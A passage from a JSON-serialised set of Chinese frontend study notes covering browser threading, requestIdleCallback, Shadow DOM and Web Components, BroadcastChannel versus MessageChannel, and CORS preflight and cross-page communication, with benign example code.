管理事件队列，当事件被触发时，将其添加到队列中等待主线程处理。\n        - JS 引擎自己忙不过来，需要浏览器另开线程协助\n- **垃圾回收线程**：\n    - 负责 JavaScript 的内存垃圾回收，以释放不再使用的内存。\n- 插件线程：\n    - 用于运行浏览器插件，每个插件可能在自己的线程中运行。\n- ==调试线程==：\n    - 用于支持开发者工具和日志记录，帮助诊断问题和性能分析。\n\n需要注意的是，虽然 Chrome 是==多线程==的，\n- 但 JavaScript 在浏览器中仍然是**单线程**执行的（除非使用 Web Workers）。\n- 这种设计是为了简化编程模型，避免复杂的线程同步问题\n- 同时也与 JavaScript 的主要用途\n\t- 处理用户交互和操作 DOM 相符合。\n\n## 6. JavaScript 引擎 与 Chrome 其他线程的关系\n\n总的来说，JavaScript 引擎（V8）是 Chrome 浏览器渲染进程的核心组件之一\n- **在专门的线程上运行，负责执行 JavaScript 代码，但同时也与浏览器的其他部分（如 GUI 渲染、事件处理、网络请求等）紧密协作**。\n\n这种设计既保证了 JavaScript 的执行效率，又维护了浏览器的整体性能和安全性。\n\n理解 JavaScript 引擎与浏览器进程线程架构的关系，对于开发高性能的 Web 应用和理解浏览器的工作原理都非常重要。\n\n- JavaScript 引擎与渲染进程：\n\t- JavaScript 引擎（V8）运行在浏览器的**渲染进程（Renderer Process）中**。\n\t- **渲染进程**是负责将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页的核心进程。\n\t- 在同一个渲染进程中，除了 JavaScript 引擎，还包括==排版引擎==（如 Blink）\n- JavaScript 引擎线程：\n\t- JavaScript 引擎在渲染进程中运行在一个**专门的线程**上，通常被称为 **JS 引擎线程或主线程**。\n\t- 这个线程负责解析和执行 JavaScript 代码。\n- 与 **GUI 渲染线程**的关系：\n\t- JavaScript 引擎线程和 GUI 渲染线程是**互斥**的。\n\t\t- 这意味着当 JS 引擎执行时，GUI 渲染线程会被挂起。\n\t\t- 这种设计是为了防止渲染出现不可预期的结果。\n\t\t- 所以，当 JavaScript 执行时间过长，可能会导致页面渲染的卡顿。\n- 事件循环和**消息队列**：\n\t- JavaScript 是单线程的，但通过**事件循环（Event Loop）和消息队列**来处理异步操作\n\t\t- **事件循环和消息队列的机制**\n\t\t\t- 允许 JavaScript 在不阻塞主线程的情况下处理 I/O 操作、定时器等异步任务\n- 与其他进程的交互：\n\t- JavaScript 引擎运行在渲染进程中\n\t\t- 但它可以通过进程间通信（IPC）与其他进程（如浏览器主进程、网络进程等）进行交互\n\t\t- 这种交互允许 JavaScript 执行网络请求、访问本地存储等操作\n- Web Workers：\n\t- 为了解决 JavaScript 单线程的限制，现代浏览器支持 Web Workers。\n\t- Web Workers 允许在后台线程中运行 JavaScript，不会直接影响主线程的执行。\n\t- 但是，Web Workers 不能直接操作 DOM，它们主要用于执行耗时的计算任务。\n- V8 引擎的优化：\n\t- V8 引擎内部有多个线程协同工作，如编译线程、优化线程和垃圾回收线程。\n\t- 这些内部线程帮助 V8 实现 JIT（即时编译）、代码优化和内存管理，提高 JavaScript 的执行效率。\n- 沙箱隔离：\n\t- JavaScript 引擎在渲染进程中运行，这种设计提供了一定程度的安全隔离。\n\t- 每个标签页通常运行在独立的渲染进程中，这意味着一个标签页中的 JavaScript 代码不能直接访问或影响其他标签页。\n\n","cd0Ts8oL":"\n# requestIdleCallback\n\n`#R1` `#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n- `requestIdleCallback` 允许开发者在**浏览器的空闲时间**执行后台或低优先级的任务。\n- 它的工作原理是利用**浏览器的空闲周期**来执行任务，而不会影响关键的渲染和交互操作\n\n## 2. API \n\nAPI： `window.requestIdleCallback(callback[, options])`\n \n```javascript\nrequestIdleCallback(myNonEssentialWork);\n\n// 非必要任务\nfunction myNonEssentialWork(deadline) {\n  // timeRemaining()： 返回当前空闲期还剩余的毫秒数\n  // didTimeout： 一个布尔值，表示任务是否已经超时\n  while (deadline.timeRemaining() > 0 && tasks.length > 0) {\n    doWorkIfNeeded();\n  }\n  if (tasks.length > 0) {\n    requestIdleCallback(myNonEssentialWork);\n  }\n}\n\n```\n\n## 3. 使用场景\n\n`requestIdleCallback` 主要用于执行非必要的后台任务或计算，例如：\n- 数据预加载\n- 长列表的渐进式渲染\n- 复杂计算的分割执行\n- 非关键数据的处理和分析\n- 大量 DOM 操作：\n\t- 例如，动态插入大量 DOM 元素时，可以使用 `requestIdleCallback` 分批处理，避免长时间阻塞主线程。\n- 数据处理：\n\t- 处理大量数据或执行复杂计算时，可以将任务分割并在空闲时执行。\n- 预加载：\n\t- 在用户不活跃时预加载资源或数据\n\n## 4. 它影响了React Fiber 架构设计\n\nReact 的 **Fiber 架构** 在内部实现了类似 `requestIdleCallback` 的机制，用于将渲染工作分割成小块，在浏览器空闲时执行。\n- 这允许 React 在不阻塞主线程的情况下进行复杂的更新操作\n\n## 5. 注意\n\n- 不要在 `requestIdleCallback` 中执行 DOM 操作，因为它可能会触发重排或重绘，影响性能\n- 对于有**时间限制**的任务\n\t- 应该使用 setTimeout 或 requestAnimationFrame，而不是 requestIdleCallback","OmI51GKU":"\n# Shadow dom 与 Web Component\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. shadow dom \n\n### 1.1. 两种 DOM\n\n![图片&文件](./files/20241024-9.png)\n所以，有两种 DOM，如下图：\n\n![图片&文件](./files/20241024-10.png)\n\n### 1.2. 定义\n\nShadow DOM 是 Web Components 标准的一个重要部分，它提供了一种封装和隔离 Web 组件的方法\n\n### 1.3. 优势\n\n- 样式隔离\n- 性能优化，因为浏览器可以独立渲染更新他们\n- 安全性：比如 `dom.attachShadow({mode: 'closed'})` ，外部 js 无法访问他们\n- 封装性与可维护性\n\n## 2. 聊聊 Web Component\n\n> 它里面的，一些概念如`template` 与 `插槽slot` 影响如`Vue`类的框架\n\n- `window.customElements.define()` 方法来自定义 `组件` ，下面是一个简单实现 `<user-card>`\n\t- ![图片&文件](./files/20241024-11.png)\n\t\t- 要点 1：`<template id=\"userCardTemplate\"/>`\n\t\t- 要点 2：定义 `window.customElements.define('user-card',UserCard)`\n\t\t- 要点 3：定义 `UserCard`\n\nWeb Components 的核心特性：\n- 自定义元素：创建新的 HTML 标签\n- Shadow DOM：封装组件的内部结构和样式\n- HTML 模板：定义组件的结构\n\n### 2.1. 实现一个 custom-counter \n\n![图片&文件](./files/20241024-13.png)\n\n```html hl:17,15,36,34\n<!doctype html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <title>Custom Counter Web Component</title>\n    </head>\n    <body>\n        <custom-counter></custom-counter>\n        <script>\n            class CustomCounter extends HTMLElement {\n                constructor() {\n                    super();\n                    this.count = 0;\n                    this.attachShadow({ mode: \"open\" });\n                }\n                // connectedCallback是Web Components 生命周期中的一个关键钩子函数。\n                // 它是自定义元素规范定义的四个生命周期回调之一\n                // 另外三个是：connectedCallback、disconnectedCallback 和 adoptedCallback\n                // 当自定义元素被移除时，disconnectedCallback 会被调用\n                // 当自定义元素首次被插入到文档的 DOM 中时，connectedCallback 会被自动调用\n                // 通常在这里进行一些初始化的操作，比如创建 shadow DOM、添加事件监听器等\n                connectedCallback() {\n                    this.render();\n                    this.shadowRoot\n                        .querySelector(\"#increment\")\n                        .addEventListener(\"click\", () => this.increment());\n                    this.shadowRoot\n                        .querySelector(\"#decrement\")\n                        .addEventListener(\"click\", () => this.decrement());\n                }\n\n                render() {\n                    this.shadowRoot.innerHTML = `\n\t\t\t\t\t  <style>\n\t\t\t\t\t\t:host {\n\t\t\t\t\t\t  display: block;\n\t\t\t\t\t\t  font-family: Arial, sans-serif;\n\t\t\t\t\t\t  background-color: `#f0f0f0;`\n\t\t\t\t\t\t  padding: 20px;\n\t\t\t\t\t\t  border-radius: 5px;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t`#counter` {\n\t\t\t\t\t\t  font-size: 24px;\n\t\t\t\t\t\t  margin-bottom: 10px;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbutton {\n\t\t\t\t\t\t  font-size: 16px;\n\t\t\t\t\t\t  margin: 0 5px;\n\t\t\t\t\t\t  padding: 5px 10px;\n\t\t\t\t\t\t  cursor: pointer;\n\t\t\t\t\t\t}\n\t\t\t\t\t  </style>\n\t\t\t\t\t  <div id=\"counter\">Count: ${this.count}</div>\n\t\t\t\t\t  <button id=\"decrement\">-</button>\n\t\t\t\t\t  <button id=\"increment\">+</button>\n\t\t\t\t\t`;\n                }\n\n                increment() {\n                    this.count++;\n                    this.updateCounter();\n                }\n\n                decrement() {\n                    this.count--;\n                    this.updateCounter();\n                }\n\n                updateCounter() {\n                    this.shadowRoot.querySelector(\"#counter\").textContent =\n                        `Count: ${this.count}`;\n                }\n            }\n\n            customElements.define(\"custom-counter\", CustomCounter);\n        </script>\n    </body>\n</html>\n\n```\n\n## 3. Web Components 定义组件样式时，`:host`的作用是？\n\n`\":host\" 选择器`用于选择自定义元素本身，即**组件的根元素**\n\n![图片&文件](./files/20241024-12.png)\n","bGMmF398":"\n# BroadcastChannel 和 MessageChannel 对比\n\n`#bom` `#R1` \n\n\n> 另外见 [3. MessageChannel](/post/RIOoYtCK.html)\n> [17. BroadcastChannel](/post/nrVrtgIK.html)\n\n\n> `BroadcastChannel` 和 `MessageChannel` 是两种不同的通信机制，它们有==很大的区别==\n> 一个**广播**\n> 一个是**点对点**\n\n\n## 目录\n<!-- toc -->\n ## 1. 主要区别 \n\n| 特性   | BroadcastChannel | MessageChannel    |     |\n| ---- | ---------------- | ----------------- | --- |\n| 通信模式 | 一对多（广播）          | 一对一（点对点）          |     |\n| 端口数量 | 无限制（同一频道）        | 固定两个端口            |     |\n| 作用域  | **同源**的所有标签页/窗口  | 任意两个**上下文**之间     |     |\n| 使用场景 | **同源页面间的消息广播**   | **两个执行上下文间**的私密通信 |     |\n|      |                  |                   |     |\n|      |                  |                   |     |\n\n## 2. 代码示例对比\n\n### 2.1. BroadcastChannel 示例\n\n```javascript\n// 页面 A\nconst channelA = new BroadcastChannel('chat');\n\n// 发送消息\nchannelA.postMessage('Hello from Page A');\n\n// 接收消息\nchannelA.onmessage = (event) => {\n    console.log('Page A received:', event.data);\n};\n\n// 页面 B\nconst channelB = new BroadcastChannel('chat');\n\n// 发送消息\nchannelB.postMessage('Hello from Page B');\n\n// 接收消息\nchannelB.onmessage = (event) => {\n    console.log('Page B received:', event.data);\n};\n\n// 页面 C\nconst channelC = new BroadcastChannel('chat');\n// 所有订阅同一频道的页面都能收到消息\n```\n\n### 2.2. MessageChannel 示例：\n\n```javascript\n// 创建通道\nconst channel = new MessageChannel();\nconst { port1, port2 } = channel;\n\n// 设置端口1的消息处理器\nport1.onmessage = (event) => {\n    console.log('Port1 received:', event.data);\n};\n\n// 设置端口2的消息处理器\nport2.onmessage = (event) => {\n    console.log('Port2 received:', event.data);\n};\n\n// 发送消息\nport1.postMessage('Hello from port1');\nport2.postMessage('Hello from port2');\n```\n\n## 3. 使用场景对比\n\n### 3.1. BroadcastChannel 适用场景：\n\n- 多标签页同步状态\n- 多窗口数据同步\n\n```javascript hl:1,18\n// 1. 多标签页同步状态\nconst loginChannel = new BroadcastChannel('login');\n\n// 登录页面\nfunction login() {\n    // 用户登录成功后\n    loginChannel.postMessage({ type: 'LOGIN_SUCCESS', user: 'John' });\n}\n\n// 其他标签页\nloginChannel.onmessage = (event) => {\n    if (event.data.type === 'LOGIN_SUCCESS') {\n        // 更新所有标签页的登录状态\n        updateLoginState(event.data.user);\n    }\n};\n\n// 2. 多窗口数据同步\nconst dataChannel = new BroadcastChannel('data-sync');\n\n// 当一个页面更新数据时\nfunction updateData(newData) {\n    saveToLocalStorage(newData);\n    dataChannel.postMessage({ type: 'DATA_UPDATED', data: newData });\n}\n\n// 其他页面监听更新\ndataChannel.onmessage = (event) => {\n    if (event.data.type === 'DATA_UPDATED') {\n        refreshUI(event.data.data);\n    }\n};\n```\n\n### 3.2. MessageChannel 适用场景：==同一上下文通讯==\n\n- iframe 通信\n- Web Worker 通信\n- 组件间隔离通信\n\n```javascript hl:1,15,27\n// 1. iframe 通信\nconst iframe = document.getElementById('myIframe');\nconst channel = new MessageChannel();\n\n// 主页面设置\nchannel.port1.onmessage = (event) => {\n    console.log('Main page received:', event.data);\n};\n\n// 将 port2 传递给 iframe\niframe.onload = () => {\n    iframe.contentWindow.postMessage('init', '*', [channel.port2]);\n};\n\n// 2. Web Worker 通信\nconst worker = new Worker('worker.js');\nconst channel = new MessageChannel();\n\n// 主线程设置\nchannel.port1.onmessage = (event) => {\n    console.log('Main thread received:', event.data);\n};\n\n// 将 port2 传递给 worker\nworker.postMessage({ port: channel.port2 }, [channel.port2]);\n\n// 3. 组件间隔离通信\nclass ComponentA {\n    constructor(port) {\n        this.port = port;\n        this.port.onmessage = this.handleMessage.bind(this);\n    }\n\n    handleMessage(event) {\n        console.log('Component A received:', event.data);\n    }\n\n    sendMessage(data) {\n        this.port.postMessage(data);\n    }\n}\n\nclass ComponentB {\n    constructor(port) {\n        this.port = port;\n        this.port.onmessage = this.handleMessage.bind(this);\n    }\n\n    handleMessage(event) {\n        console.log('Component B received:', event.data);\n    }\n\n    sendMessage(data) {\n        this.port.postMessage(data);\n    }\n}\n\n// 创建组件间的通信通道\nconst channel = new MessageChannel();\nconst componentA = new ComponentA(channel.port1);\nconst componentB = new ComponentB(channel.port2);\n```\n\n## 4. 关闭和清理\n\n```javascript hl:1,6\n// BroadcastChannel\nconst broadcastChannel = new BroadcastChannel('example');\n// 使用完毕后关闭\nbroadcastChannel.close();\n\n// MessageChannel\nconst channel = new MessageChannel();\n// 使用完毕后关闭两个端口\nchannel.port1.close();\nchannel.port2.close();\n```\n\n## 5. 错误处理\n\n```javascript\n// BroadcastChannel 错误处理\nconst broadcastChannel = new BroadcastChannel('example');\n\nbroadcastChannel.onmessageerror = (event) => {\n    console.error('Broadcast message error:', event);\n};\n\n// MessageChannel 错误处理\nconst channel = new MessageChannel();\n\nchannel.port1.onmessageerror = (event) => {\n    console.error('Port1 message error:', event);\n};\n\nchannel.port2.onmessageerror = (event) => {\n    console.error('Port2 message error:', event);\n};\n```\n\n## 6. 总结：\n\n1. **BroadcastChannel**:\n\t- 用于同源页面间的广播通信\n\t- 简单易用，一对多通信\n\t- 适合多标签页同步状态\n\t- 只能在同源页面间使用\n\n2. **MessageChannel**:\n\t- 用于**两个执行上下文间的点对点通信**\n\t- 提供更高的隔离性和安全性\n\t- 适合 **iframe、Web Worker** 通信\n\t- 可以跨源通信（需要正确设置）\n\n选择使用哪种通道取决于你的具体需求：\n- 需要广播消息给多个接收者？\n\t- 选择 BroadcastChannel\n- 需要两个执行上下文间的私密通信？\n\t- 选择 MessageChannel\n\n## 7. MessageChannel 是否支持跨域\n\n`MessageChannel` 本身不能直接跨域通信，但它可以**配合 postMessage 在已建立跨域通信的上下文之间传递端口**，从而实现跨域通信\n\n\n>  Iframe 的跨域场景：更多详见 [13. 跨域与跨页面通讯](/post/d02mMGxE.html)\n\n## 8. 更多\n\n- [3. MessageChannel](/post/RIOoYtCK.html)\n- [17. BroadcastChannel](/post/nrVrtgIK.html)","d02mMGxE":"\n# 跨域与跨页面通讯\n\n`#跨域` `#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 跨域问题 \n\n### 1.1. 列举下跨页面通讯的方式\n\n![图片&文件](./files/20241028-15.png)\n\n### 1.2. 跨域的表现、如何跨域？\n\n![图片&文件](./files/20241028-16.png)\n\n- 简单请求，直接在 origin 中添加字段\n- 非简单请求，需要预检\n\n![图片&文件](./files/20241028-17.png)\n\n### 1.3. 关于跨域、为什么非简单请求不需要预检，而其他请求需要预检\n\n### 1.4. 简单请求的条件\n\n一个请求必须**同时满足以下所有条件才是简单请求**：\n\n- 请求方法仅限于：\n\t- GET\n\t- POST\n\t- HEAD\n- 允许的请求头：\n\t- Accept\n\t- Accept-Language\n\t- Content-Language\n\t- Content-Type（仅限于以下三种）：\n\t\t - text/plain\n\t\t - multipart/form-data\n\t\t - application/x-www-form-urlencoded\n\t- DPR\n\t- Downlink\n\t- Save-Data\n\t- Viewport-Width\n\t- Width\n- 请求中**没有自定义头部**\n- 请求中没有使用 `ReadableStream` 对象\n\n### 1.5. 为什么需要预检请求？\n\n**预检请求（Preflight）** 的主要目的是为了**保护服务器**。原因如下：\n\n#### 1.5.1. **向后兼容**\n\n```javascript\n// 旧服务器只知道处理简单请求\n// 如果直接发送复杂请求可能会导致意外行为\nfetch('api.example.com/data', {\n    method: 'DELETE',  // 非简单请求\n    headers: {\n        'Content-Type': 'application/json'  // 非简单请求的 Content-Type\n    }\n});\n```\n\n#### 1.5.2. **安全性考虑**\n\n```javascript\n// 预检请求可以让服务器事先检查：\n// 1. 该源是否被允许\n// 2. 该方法是否被允许\n// 3. 该头部是否被允许\nconst headers = new Headers({\n    'X-Custom-Header': 'value',  // 自定义头部需要预检\n    'Content-Type': 'application/json'\n});\n\nfetch('api.example.com/data', {\n    method: 'PUT',\n    headers: headers,\n    body: JSON.stringify({ key: 'value' })\n});\n```\n\n#### 1.5.3. **避免服务器端的副作用**\n\n```javascript\n// DELETE 请求可能会删除数据\n// PUT 请求可能会修改数据\n// 预检请求可以在实际操作前验证权限\nasync function deleteResource() {\n    // 会首先发送 OPTIONS 请求\n    const response = await fetch('api.example.com/resource/123', {\n        method: 'DELETE',\n        headers: {\n            'Authorization': 'Bearer token'\n        }\n    });\n}\n```\n\n### 1.6. 预检请求的过程\n\n#### 1.6.1. **OPTIONS 请求**\n\n```http\nOPTIONS /resource/123 HTTP/1.1\nHost: api.example.com\nOrigin: https://example.com\nAccess-Control-Request-Method: DELETE\nAccess-Control-Request-Headers: Authorization\n```\n\n#### 1.6.2. **服务器响应**\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://example.com\nAccess-Control-Allow-Methods: DELETE, PUT, POST, GET, OPTIONS\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Max-Age: 86400\n```\n\n#### 1.6.3. **实际请求**\n\n```http\nDELETE /resource/123 HTTP/1.1\nHost: api.example.com\nOrigin: https://example.com\nAuthorization: Bearer token\n```\n\n### 1.7. 为什么简单请求不需要预检？\n\n#### 1.7.1. **历史原因**\n\n```html\n<!-- 在 CORS 出现之前，这些操作就已经可以跨域了 -->\n<form action=\"https://other-domain.com/form\" method=\"POST\">\n    <input type=\"text\" name=\"data\">\n    <button type=\"submit\">Submit</button>\n</form>\n\n<img src=\"https://other-domain.com/image.jpg\">\n```\n\n#### 1.7.2. **安全性考虑**\n\n```javascript\n// 简单请求的特点：\n// 1. 不会改变服务器数据（GET）\n// 2. 使用传统的数据格式（form-data）\n// 3. 不包含自定义头部\nfetch('api.example.com/data', {\n    method: 'GET',\n    headers: {\n        'Accept': 'application/json'\n    }\n});\n```\n\n### 1.8. 最佳实践： **缓存预检请求** → 设置更久一些也行\n\n```javascript hl:3\n// 服务器端设置预检请求的缓存时间\napp.options('/api', (req, res) => {\n    res.header('Access-Control-Max-Age', '86400'); // 24小时\n    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n    res.send();\n});\n```\n\n## 2. 跨页面通讯的方式都有哪些？\n\n### 2.1. 同源\n\n#### 2.1.1. BroadCast Channel\n\n```javascript hl:1,3,9\nconst bc = new BroadcastChannel('AlienZHOU');\n// 复制代码各个页面可以通过 onmessage 来监听被广播的消息：\nbc.onmessage = function (e) {\n    const data = e.data;\n    const text = '[receive] ' + data.msg + ' —— tab ' + data.from;\n    console.log('[BroadcastChannel] receive message:', text);\n};\n// 复制代码要发送消息时只需要调用实例上的postMessage方法即可：\nbc.postMessage(mydata);\n```\n\n#### 2.1.2. `sw` ，也可以用来检测页面是否崩溃\n\n```javascript hl:2,7,23\n/* 页面逻辑 */\nnavigator.serviceWorker.register('../util.sw.js').then(function () {\n    console.log('Service Worker 注册成功');\n});\n\n/* ../util.sw.js Service Worker 逻辑 */\nself.addEventListener('message', function (e) {\n    console.log('service worker receive message', e.data);\n    e.waitUntil(\n        self.clients.matchAll().then(function (clients) {\n            if (!clients || clients.length === 0) {\n                return;\n            }\n            // 通过调用每个 client（即页面）的 postMessage 方法，向页面发送消息。\n            clients.forEach(function (client) {\n                client.postMessage(e.data);\n            });\n        })\n    );\n});\n\n/* 页面逻辑 */\nnavigator.serviceWorker.addEventListener('message', function (e) {\n    const data = e.data;\n    const text = '[receive] ' + data.msg + ' —— tab ' + data.from;\n    console.log('[Service Worker] receive message:', text);\n});\n```\n\n#### 2.1.3. storage事件\n\n- localStorage → window.addEventListener('storage' , fun)\n- “共享存储+长轮询” \n\t- → 其实只用在 Tab A 中监听`visibilitychange`这样的事件，来做一次信息同步即可\n\n#### 2.1.4. Shared Worker\n\n`Shared Worker` 是 Web Workers API 的一种特殊类型，**它允许多个浏览器上下文（如窗口、标签页或 iframe）共享同一个 worker 实例**。这使得不同的页面可以通过这个共享的 worker 进行通信和数据共享\n\n```javascript hl:2\n// 在页面中创建 Shared Worker\nconst worker = new SharedWorker('sharedworker.js');\n\n// 在 worker 中\nself.onconnect = function(e) {\n  const port = e.ports[0];\n  port.onmessage = function(e) {\n    // 处理消息\n  }\n};\n\n```\n\n- Shared Workers 遵循同源策略\n- 不能访问 DOM\n\n#### 2.1.5. window.open 与 window.opener \n\n- 当我们使用`window.open`打开页面时，方法会返回一个被打开页面`window`的引用。\n- 而在未显示指定`noopener`时，被打开的页面可以通过`window.opener`获取到打开它的页面的引用\n\n#### 2.1.6. 服务中转\n\n如`websocket`等\n\n#### 2.1.7. 轮询 + indexedDB\n\n`IndexedDB`，消息发送方将消息存至 `IndexedDB` 中；接收方（例如所有页面）则通过**轮询**去获取最新的信息\n\n### 2.2. 非同源\n\n![图片&文件](./files/20241024-14.png)\n\n## 3. iframe 通讯的方法有哪些\n\n- 1. **对于主域相同而子域不同的例子**，可以通过设置`document.domain`的办法来解决。\n\t- ![图片&文件](./files/20241024-15.png)\n- 使用 window.postMessage，**不同域也可以**\n\t- `window.frames[0].postMessage('Hello from parent!', 'https://child-domain.com')`\n\t- ![图片&文件](./files/20241024-16.png)\n- 利用 window.name 属性在**不同域**之间传递信息\n- **同域**下，使用 Web Storage (localStorage 或 sessionStorage) 来通讯\n- 两个**不同域**的页面可以通过向**同一个服务器**发送请求来间接通信\n\n> **使用 postMessage 方法是最推荐的跨域 iframe 通信方式**，因为它既安全又简单。\n> 它允许你指定目标源，从而防止信息被发送到不信任的目标\n> 同时，接收方也可以验证消息的来源，进一步增强安全性\n\n## 4. CORS ： 预检 option 请求 , 即平时看到的 `PreFlight`\n\n浏览器一旦发现AJAX请求跨源，就会`自动添加一些附加的头信息`，`有时还会多出一次附加的请求，但用户不会有感觉`\n\n实现CORS通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信\n\n- **简单请求\n\t- 浏览器发现跨域了，就直接在请求头加 `Origin`字段\n\t- `sever端` **判断** `Origin` **是否给数据**\n- 非简单请求：比如 `put/delete 及 application/json`\n\t- 浏览器预检 `OPTIONS` 请求\n\t- 请求头三个字段:\n\t\t- **Access-Control-Request-Method**\n\t\t- **Access-Control-Request-Headers**\n\t\t- `Origin`\n\t- 响应头返回\n\t\t- **Access-Control-Allow-Methods**\n\t\t- **Access-Control-Allow-Credentials**\n\t\t- **Access-Control-Allow-Headers**\n\t\t- **Access-Control-Max-Age**\n\t- 之后就跟简单请求一样了\n\n## 5. WebSocket 协议本身是没有跨域限制的\n\n### 5.1. 定义\n\n1. WebSocket 是一个独立的、完整的协议，与 HTTP 协议是平行的关系。\n\t- 虽然 WebSocket 连接的建立需要依赖 HTTP 协议进行一次握手（upgrade），但是一旦 WebSocket 连接建立成功后，后续的数据传输就与 HTTP 无关了。\n2. 浏览器在实现 WebSocket 协议时，==默认就是允许跨域的==。这意味着：\n\t- 你可以从任何域名下的页面连接到任何服务器的 WebSocket 服务\n\t- 不需要像 HTTP 请求那样配置 CORS（跨域资源共享）相关的头部\n\n### 5.2. 握手阶段的限制\n\n- 在 WebSocket 连接建立时的 HTTP 握手阶段，浏览器会发送 Origin 头部\n- 服务器可以通过检查 Origin 头部来决定是否允许连接\n- 这是一种服务器端的安全机制，而不是浏览器的跨域限制\n\n### 5.3. 最佳实践\n\n   ```javascript\n   // 客户端代码示例\n   const ws = new WebSocket('ws://example.com/socketserver');\n   \n   // 服务器端可以检查 Origin（以 Node.js 为例）\n   wss.on('connection', function connection(ws, request) {\n     const origin = request.headers.origin;\n     if (origin !== 'https://trusted-site.com') {\n       ws.close();\n       return;\n     }\n     // 处理正常连接...\n   });\n   ```\n\n### 5.4. 安全考虑\n\n   - 虽然 WebSocket 没有跨域限制，但出于安全考虑，**服务器端应该实现自己的验证机制**\n   - 可以通过 token、session 等方式进行身份验证\n   - 建议在生产环境使用 WSS（WebSocket Secure）协议，即基于 SSL/TLS 的安全 WebSocket 连接\n\n### 5.5. 总结\n\n**WebSocket 协议本身不受浏览器同源策略的限制**，可以自由地进行跨域通信。但为了安全性，服务器端应该实现适当的验证机制来控制连接权限。\n\n## 6. 如何在 Canvas 获取跨域的图片\n\n![图片&文件](./files/20241112-8.png)\n\n当然，需要设置图片的响应头，允许跨域\n\n## 7. 浏览器的跨标签页（Cross-tab）通信\n\n### 7.1. 问题：不同的Tab，不同的域名，一个 Tab 下面的页面使用 postMessage，另外一个 Tab 监听 message 能够监听得到吗？\n\n- 不同的 Tab，不同的域名\n\t- 当两个标签页属于不同的域名时，它们是运行在完全隔离的上下文中的。这是由于浏览器的同源策略（Same-Origin Policy）所导致的安全限制。\n- postMessage 和 message 事件\n\t- postMessage 方法是一种安全的跨源通信方式，而 message 事件用于接收通过 postMessage 发送的消息。\n- 能否监听到？\n\t- 一个 Tab 下的页面使用 postMessage，另一个 Tab 监听 message 事件，**通常情况下是无法监听到的**。\n\n 原因如下：\n1. **窗口引用问题**：postMessage 需要一个目标窗口的引用。不同 Tab 之间默认是没有这种引用的。比如使用 `window.open`\n2. **域名不同**：**即使有窗口引用**，不同域名之间的通信也需要明确指定目标源。\n3. **事件传播范围**：`message` 事件通常只在目标窗口内传播，不会跨越到其他未相关的标签页。\n\n### 7.2. 安全策略\n\n- 如果你不需要接受其他网站的 message，请不要监听 message 事件\n- 即使监听，请务必备注 origin 和 source 来验证发件人的身份\n\n### 7.3. 有一些特殊情况和解决方案\n\n1. **opener 关系**：\n\t- 如果一个标签页是由另一个标签页打开的（使用 window.open() ），则它们之间可以通过 opener 和 postMessage 进行通信。\n2. **共享存储**：\n\t- 可以使用 localStorage 或 IndexedDB 等共享存储方式，配合 storage 事件来实现跨标签页通信。\n3. **Broadcast Channel API**：\n\t- 这是一个较新的 API，允许**同源的不同上下文**（如不同的标签页）之间进行通信。\n4. **Service Worker**：\n\t- 可以使用 Service Worker 作为**中间人**来协调不同标签页之间的通信。\n5. **WebSocket**：\n\t- 可以通过服务器端的 WebSocket 连接来协调不同标签页之间的通信。\n\n## 8. 前端页面通讯的方式有哪些？\n\n![图片&文件](./files/20241111-39.png)\n\n>  sharedWorker 确实不太常用！！！\n\n## 9. 如何实现 Tab 之间通讯，不能 websocket\n\n![图片&文件](./files/20241111-23.png)\n","GDfxNXj6":"\n# 跨域时请求的实际发送情况分析\n\n`#跨域` `#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 请求发送情况分析 \n\n### 1.1. 简单请求（Simple Request）\n\n简单请求**跨域请求的实际发送情况**，但浏览器会**拦截响应**。\n\n```javascript\n// 简单请求的条件：\n// 1. 请求方法是以下之一：\n// - GET\n// - HEAD\n// - POST\n\n// 2. 请求头只包含以下字段：\n// - Accept\n// - Accept-Language\n// - Content-Language\n// - Content-Type (仅限于以下值)\n//   - text/plain\n//   - multipart/form-data\n//   - application/x-www-form-urlencoded\n\n// 简单请求示例\nfetch('http://api.example.com/data', {\n    method: 'GET',\n    headers: {\n        'Accept': 'application/json'\n    }\n}).catch(error => {\n    console.error('跨域错误，但请求已发送到服务器', error);\n});\n```\n\n### 1.2. 预检请求（Preflight Request）\n\n- 对于非简单请求，浏览器会先发送 OPTIONS 请求进行预检。\n- 服务端收到的是预检请求 options\n\n```javascript \n// 非简单请求示例（会触发预检）\nfetch('http://api.example.com/data', {\n    method: 'PUT', // 非简单方法\n    headers: {\n        'Content-Type': 'application/json', // 非简单Content-Type\n        'X-Custom-Header': 'value' // 自定义头\n    },\n    body: JSON.stringify({ data: 'test' })\n});\n\n// 预检请求实际发送的内容\n/*\nOPTIONS /data HTTP/1.1\nHost: api.example.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Content-Type, X-Custom-Header\nOrigin: http://your-site.com\n*/\n```\n\n### 1.3. 服务端日志验证\n\n```javascript\n// Node.js Express 服务器示例\nconst express = require('express');\nconst app = express();\n\n// 记录所有请求\napp.use((req, res, next) => {\n    console.log(`收到请求：${req.method} ${req.url}`);\n    console.log('请求头：', req.headers);\n    next();\n});\n\n// 处理 OPTIONS 请求\napp.options('*', (req, res) => {\n    console.log('收到预检请求');\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');\n    res.header('Access-Control-Allow-Headers', 'Content-Type,X-Custom-Header');\n    res.sendStatus(200);\n});\n\n// 处理实际请求\napp.get('/data', (req, res) => {\n    console.log('收到 GET 请求');\n    // 即使没有设置 CORS 头，服务器也会收到并处理请求\n    res.json({ message: 'Hello' });\n});\n```\n\n### 1.4. 常见场景分析\n\n#### 1.4.1. 场景一：简单请求无 CORS 头\n\n```javascript\n// 